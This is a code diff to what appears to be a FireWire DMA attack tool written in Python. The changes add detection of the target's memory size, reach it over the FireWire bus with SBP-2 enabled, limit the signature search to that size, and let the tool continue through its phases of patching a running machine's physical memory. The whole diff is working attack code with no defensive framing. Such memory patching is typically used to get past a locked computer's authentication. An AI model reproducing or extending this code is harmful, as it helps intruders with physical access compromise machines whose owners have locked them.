@@ -128,17 +128,23 @@ def run(context):
     else:
         d = initialize_fw(d)
     
+    # Find memory size
+    memsize = findmemsize(d)
+    if not memsize:
+        fail('Could not determine memory size. Try increasing the delay after enabling SBP2 (-d switch)')
+    else:
+        ctx.memsize = memsize
+    
     # Attack
     print_msg('+', 'Starting attack...')
     for i, phase in enumerate(phases):
         try:
             # Find
             if not one_phase: print_msg('+', 'Phase ' + str(i + 1) + ':')
-            addr = findsig(d, phase.sig, phase.offset)
+            addr = findsig(d, phase.sig, phase.offset, ctx.memsize)
             if not addr:
                 s._success = False
-                break
-            print()
+                continue
             print_msg('+', 'Signature found at 0x%x.' % addr)
             # Patch and verify if not dry run
             if not ctx.dry_run:
@@ -147,15 +153,29 @@ def run(context):
                     print_msg('+', 'Write-back verified; patching successful.')
                 else:
                     print_msg('-', 'Write-back could not be verified; patching unsuccessful.')
-                    s._success = False
+                    #s._success = False
         except IOError:
-            print('-', 'Signature not found.')
+            print('-', 'I/O Error, make sure FireWire interfaces are properly connected.')
             s._success = False
-        if not s._success:
-            break
+        #if not s._success:
+        #    break
         
     if not s._success:
-        fail('Attack unsuccessful.')
+        fail('Signature not found.')
+
+
+def findmemsize(d):
+    mb = 1024 * 1024 # One MB
+    # Iterate through possible memory sizes and check if we get data when reading
+    step = 128 * mb
+    fwmax = 4096 * mb
+    chunk = ctx.PAGESIZE # Read page sized chunks of data
+    for addr in range(fwmax, 0, -step):
+        buf = d.read(addr - chunk, chunk)
+        if buf:
+            if ctx.verbose: print_msg('*', 'Found memory size:' + str(addr/mb) + ' MB')
+            return addr
+    return None
 
 
 def list_targets(methods):
@@ -220,10 +240,14 @@ def initialize_fw(d):
     b = Bus()
     # Enable SBP-2 support to ensure we get DMA
     b.enable_sbp2()
-    for i in range(ctx.fw_delay, 0, -1):
-        sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait %2d seconds\r' % i)
-        sys.stdout.flush()
-        sleep(1)
+    try:
+        for i in range(ctx.fw_delay, 0, -1):
+            sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C\r' % i)
+            sys.stdout.flush()
+            sleep(1)
+    except KeyboardInterrupt:
+        print_msg('!', 'Interrupted')
+        pass
     # Open the first device
     d = b.devices()[0]
     d.open()
@@ -231,21 +255,22 @@ def initialize_fw(d):
     return d
 
 
-def findsig(d, sig, off):
+def findsig(d, sig, off, memsize):
     # Skip the first 1 MiB of memory
-    one_mib = 1 * 1024 * 1024
-    addr = one_mib + off
+    one_mb = 1 * 1024 * 1024
+    addr = one_mb + off
     # An array to store the last read values of data so that we can assess if
     # we're sucking data through the wire or not
     buf = collections.deque(ctx.buflen * [0], ctx.buflen)
-    # Make sure we don't go outside of FireWire max DMA address 0xffffffff (4GB)
-    fw_max_addr = 4 * 1024 * one_mib
-    while addr < fw_max_addr:
+
+    while addr < memsize:
         # Prepare a batch of 128 requests
         r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
         for caddr, cand  in d.readv(r):
-            if cand == sig: return caddr
-        mibaddr = math.floor((addr + one_mib) / (one_mib)) # Account for the first MiB
+            if cand == sig: 
+                print()
+                return caddr
+        mibaddr = math.floor((addr + one_mb) / (one_mb)) # Account for the first MiB
         sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
         if ctx.verbose:
             sys.stdout.write(' Data read: 0x{0}'.format(hexlify(cand).decode(ctx.encoding)))
@@ -262,15 +287,18 @@ def findsig(d, sig, off):
                          'could be outside memory\n    boundaries, or simply ' \
                          'not have DMA. Try using -v/--verbose to debug.\n    '\
                          'Continue? [Y/n]: ')
-            if cont == 'n': fail('Attack unsuccessful')
+            if cont == 'n':
+                fail()
             else: # Double the buffer
                 buf = collections.deque(buf.maxlen * 2 * [0], buf.maxlen * 2)
         
         addr += ctx.PAGESIZE * 128
+    print()
     return
 
 
-def fail(msg):
-    print_msg('!', msg)
+def fail(msg = None):
+    if msg: print_msg('!', msg)
+    print('[!] Attack unsuccessful.')
     sys.exit(1)
     
